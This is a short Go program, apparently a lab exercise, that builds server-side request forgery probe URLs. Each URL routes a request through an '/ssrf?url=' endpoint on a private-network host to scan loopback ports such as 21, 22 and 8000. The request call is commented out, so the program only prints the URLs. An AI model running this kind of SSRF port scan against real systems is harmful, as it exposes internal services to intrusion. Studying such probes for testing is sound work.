package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
)

func HttpGet(url string) string {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		panic(err)
	}
	client := new(http.Client)
	response, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
	}
	return string(body)
}

func main() {

	var ptr []int
	ptrStr := []string{}
	allP := make([]int, 65536)
	for p := range allP {
		ptr = append(ptr, p)
	}
	for i := range ptr {
		n := ptr[i]
		text := strconv.Itoa(n)
		ptrStr = append(ptrStr, text)
	}

	ports := []string{
		"21", "22", "23", "8000", "8090",
	}
	for _, p := range ports {
		url := fmt.Sprintf("http://192.168.0.102:5000/ssrf?url=http://127.0.0.1:%s", p)
		//fmt.Println(HttpGet(url))
		fmt.Println(url)
	}

}
